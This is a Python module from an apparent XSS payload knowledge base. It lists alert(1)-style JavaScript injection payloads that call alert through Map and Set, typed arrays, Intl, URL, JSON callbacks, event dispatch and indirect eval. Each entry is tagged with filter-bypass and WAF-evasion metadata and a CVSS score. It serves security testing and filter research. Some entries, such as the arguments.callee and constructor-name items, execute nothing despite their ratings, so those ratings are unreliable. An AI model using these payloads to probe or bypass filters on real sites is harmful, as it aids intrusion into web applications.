#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Final Frontier XSS Payloads - Part 3
Map/Set methods, Typed Array methods, Intl object methods, URL/URLSearchParams, FormData methods, Headers methods, Math object tricks, JSON methods, Event target methods, and Miscellaneous deep knowledge.
"""

from ..models import PayloadEntry


BRS_KB_FINAL_FRONTIER_PAYLOADS_PART3 = {
    # ============================================================
    # MAP/SET METHODS
    # ============================================================
    "map-forEach": PayloadEntry(
        payload="new Map([[1,alert]]).forEach(f=>f(1))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Map forEach execution",
        tags=["map", "forEach"],
        bypasses=["map_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "set-forEach": PayloadEntry(
        payload="new Set([alert]).forEach(f=>f(1))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Set forEach execution",
        tags=["set", "forEach"],
        bypasses=["set_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # TYPED ARRAY METHODS
    # ============================================================
    "typedArray-forEach": PayloadEntry(
        payload="new Uint8Array([1]).forEach(alert)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="TypedArray forEach",
        tags=["typedarray", "forEach"],
        bypasses=["array_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "typedArray-map": PayloadEntry(
        payload="new Uint8Array([1]).map(alert)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="TypedArray map",
        tags=["typedarray", "map"],
        bypasses=["array_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # INTL OBJECT METHODS
    # ============================================================
    "intl-collator": PayloadEntry(
        payload="new Intl.Collator('en',{sensitivity:alert(1)||'base'})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Intl.Collator with side effect",
        tags=["intl", "collator"],
        bypasses=["intl_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "intl-datetimeformat": PayloadEntry(
        payload="new Intl.DateTimeFormat('en',{timeZone:alert(1)||'UTC'})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Intl.DateTimeFormat with side effect",
        tags=["intl", "datetime"],
        bypasses=["intl_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # URL/URLSEARCHPARAMS
    # ============================================================
    "url-constructor-side": PayloadEntry(
        payload="new URL(alert(1)||'http://x')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="URL constructor with side effect",
        tags=["url", "constructor"],
        bypasses=["url_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "urlSearchParams-forEach": PayloadEntry(
        payload="new URLSearchParams('x=1').forEach(alert)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="URLSearchParams forEach",
        tags=["url", "params"],
        bypasses=["url_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # FORMDATA METHODS
    # ============================================================
    "formData-forEach": PayloadEntry(
        payload="new FormData().forEach(alert)||new FormData().append('x',alert(1)||'y')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="FormData with side effect",
        tags=["formdata", "forEach"],
        bypasses=["form_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # HEADERS METHODS
    # ============================================================
    "headers-forEach": PayloadEntry(
        payload="new Headers().forEach(alert)||new Headers({'X':alert(1)||'y'})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Headers with side effect",
        tags=["headers", "forEach"],
        bypasses=["header_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # MATH OBJECT TRICKS
    # ============================================================
    "math-random-side": PayloadEntry(
        payload="Math.random(alert(1))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Math.random with side effect",
        tags=["math", "random"],
        bypasses=["math_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "math-max-side": PayloadEntry(
        payload="Math.max(alert(1)||1,2)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Math.max with side effect",
        tags=["math", "max"],
        bypasses=["math_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # JSON METHODS
    # ============================================================
    "json-parse-reviver": PayloadEntry(
        payload="JSON.parse('{\"x\":1}',()=>alert(1))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="JSON.parse reviver callback",
        tags=["json", "reviver"],
        bypasses=["json_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "json-stringify-replacer": PayloadEntry(
        payload="JSON.stringify({x:1},()=>alert(1))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="JSON.stringify replacer callback",
        tags=["json", "replacer"],
        bypasses=["json_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "json-stringify-toJSON": PayloadEntry(
        payload="JSON.stringify({toJSON:alert})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="JSON.stringify toJSON method",
        tags=["json", "toJSON"],
        bypasses=["json_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # EVENT TARGET METHODS
    # ============================================================
    "eventTarget-addEventListener": PayloadEntry(
        payload="document.addEventListener('click',alert)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="addEventListener with alert",
        tags=["event", "listener"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "eventTarget-dispatchEvent": PayloadEntry(
        payload="document.body.onclick=alert;document.body.dispatchEvent(new MouseEvent('click'))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="dispatchEvent trigger",
        tags=["event", "dispatch"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # MISCELLANEOUS DEEP KNOWLEDGE
    # ============================================================
    "misc-arguments-callee": PayloadEntry(
        payload="(function(){arguments.callee.caller})()",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Arguments callee access (deprecated)",
        tags=["arguments", "callee"],
        bypasses=["arguments_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "misc-with-eval": PayloadEntry(
        payload="with({alert})eval('alert(1)')",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="With statement + eval",
        tags=["with", "eval"],
        bypasses=["with_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "misc-indirect-eval-call": PayloadEntry(
        payload="window['eval']('alert(1)')",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Bracket notation eval",
        tags=["eval", "bracket"],
        bypasses=["eval_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "misc-constructor-name": PayloadEntry(
        payload="''.constructor.constructor.name",
        contexts=["javascript"],
        severity="low",
        cvss_score=4.0,
        description="Constructor name leak",
        tags=["constructor", "name"],
        bypasses=["constructor_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
}
